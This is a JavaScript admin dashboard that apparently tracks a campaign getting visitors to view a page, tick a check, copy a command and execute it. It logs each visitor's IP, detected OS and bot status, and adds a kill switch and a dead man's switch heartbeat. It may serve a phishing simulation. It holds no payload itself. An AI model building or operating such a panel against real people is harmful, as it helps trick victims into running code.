const ADMIN_KEY = prompt('Admin Key:') || '';
let killState = false;

function showFatal(msg) {
    document.body.innerHTML = `<h1 style="color:white;text-align:center;margin-top:100px;font-family:sans-serif;">${msg}</h1>`;
}

// Socket auth — the server rejects unauthenticated sockets, so the admin key
// is enforced server-side now (previously the key check was cosmetic and
// stats were broadcast to any visitor).
const socket = io({ auth: { adminKey: ADMIN_KEY } });

socket.on('connect_error', (err) => {
    showFatal(err && err.message === 'unauthorized' ? 'Unauthorized' : 'Server Offline');
});

// HTTP auth check for immediate feedback
fetch('/api/admin/stats', {headers: {'X-Admin-Key': ADMIN_KEY}})
    .then(r => { if (!r.ok) showFatal('Unauthorized'); })
    .catch(() => {});

function esc(s) {
    return String(s == null ? '' : s)
        .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;').replace(/'/g, '&#39;');
}

function updateStats(data) {
    document.getElementById('stat-total').textContent = data.total;
    document.getElementById('stat-executed').textContent = data.executed;
    document.getElementById('stat-conversion').textContent = data.total > 0 ? ((data.executed/data.total)*100).toFixed(1) + '%' : '0%';
    document.getElementById('stat-bots').textContent = data.bots;

    // Funnel bar
    const max = Math.max(data.funnel.viewed, 1);
    const p = (n) => (n/max)*100;
    document.getElementById('funnel-viewed').style.width = p(data.funnel.viewed) + '%';
    document.getElementById('funnel-viewed').textContent = data.funnel.viewed;
    document.getElementById('funnel-checked').style.width = p(data.funnel.checked) + '%';
    document.getElementById('funnel-checked').textContent = data.funnel.checked;
    document.getElementById('funnel-copied').style.width = p(data.funnel.copied) + '%';
    document.getElementById('funnel-copied').textContent = data.funnel.copied;
    document.getElementById('funnel-executed').style.width = p(data.funnel.executed) + '%';
    document.getElementById('funnel-executed').textContent = data.funnel.executed;

    // Table — all dynamic values HTML-escaped (stored-XSS fix)
    const tbody = document.getElementById('tokens-body');
    tbody.innerHTML = '';
    data.recent.forEach(t => {
        let stages = [];
        try { stages = JSON.parse(t.stages || '[]'); } catch (e) {}
        const stageTags = stages
            .map(s => `<span class="stage-tag">${esc(s.stage)}</span>`)
            .join('');
        const status = t.executed ? '<span class="badge badge-executed">EXECUTED</span>' :
                      t.bot_flag ? '<span class="badge badge-bot">BOT</span>' :
                      '<span class="badge badge-pending">PENDING</span>';

        const row = document.createElement('tr');
        row.innerHTML = `
            <td>${esc(t.id.slice(0,16))}...</td>
            <td>${esc(t.ip)}</td>
            <td>${esc(t.os_detected || 'unknown')}</td>
            <td>${status}</td>
            <td><div class="stage-list">${stageTags}</div></td>
            <td>${esc(new Date(t.created_at).toLocaleTimeString())}</td>
        `;
        tbody.appendChild(row);
    });
}

// Kill switch
document.getElementById('kill-btn').addEventListener('click', async () => {
    const res = await fetch('/api/admin/killswitch', {
        method: 'POST',
        headers: {'X-Admin-Key': ADMIN_KEY, 'Content-Type': 'application/json'},
        body: JSON.stringify({active: !killState})
    });
    const data = await res.json();
    killState = data.killSwitch;
    updateKillButton();
});

function updateKillButton() {
    const btn = document.getElementById('kill-btn');
    if (killState) {
        btn.textContent = '✓ KILL SWITCH ACTIVE';
        btn.classList.add('active');
    } else {
        btn.textContent = '☠ ACTIVATE KILL SWITCH';
        btn.classList.remove('active');
    }
}

// Refresh
document.getElementById('refresh-btn').addEventListener('click', () => {
    socket.emit('admin:refresh');
});

// Socket events
socket.on('stats', updateStats);
socket.on('killState', (state) => {
    killState = state;
    updateKillButton();
});

// Heartbeat for dead man's switch
setInterval(() => {
    fetch('/api/admin/heartbeat', {
        method: 'POST',
        headers: {'X-Admin-Key': ADMIN_KEY}
    }).catch(() => {});
}, 30000);